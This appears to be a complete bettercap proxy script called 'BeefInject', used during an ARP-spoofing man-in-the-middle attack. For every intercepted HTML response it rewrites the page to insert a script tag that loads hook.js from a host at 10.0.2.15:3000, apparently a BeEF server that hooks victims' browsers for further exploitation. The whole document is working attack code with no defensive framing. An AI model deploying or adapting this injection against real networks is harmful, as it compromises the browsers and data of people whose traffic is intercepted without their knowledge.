function onLoad() {
    log( "BeefInject loaded." );
    log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://10.0.2.15:3000/hook.js"></script></head>' 
            ); 
        }
    }
}
